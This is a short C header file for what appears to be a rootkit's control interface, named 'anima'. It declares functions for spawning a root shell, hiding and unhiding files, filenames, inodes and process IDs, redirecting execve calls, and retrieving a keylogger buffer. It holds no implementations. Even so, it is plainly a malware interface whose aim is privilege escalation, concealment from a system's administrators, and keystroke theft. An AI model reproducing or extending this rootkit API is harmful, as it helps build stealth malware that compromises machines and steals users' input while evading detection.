#ifndef __ANIMA_API_H
#define __ANIMA_API_H


#define warn(fmt, ...) fprintf(stderr, fmt"\n", ##__VA_ARGS__)

struct rk_args;
long anima_control(long mode, struct rk_args *args);
void root_shell(void);
void hide_inode(long);
void unhide_inode(long);
void hide_file(const char *path);
void unhide_file(const char *path);
void hide_pid(pid_t pid);
void unhide_pid(pid_t pid);
void hide_filename(const char *name);
void unhide_filename(const char *name);
void redirect_execve(char *path);
void unredirect_execve(char *path);
void get_keylogger_buf(const char *path);

#endif
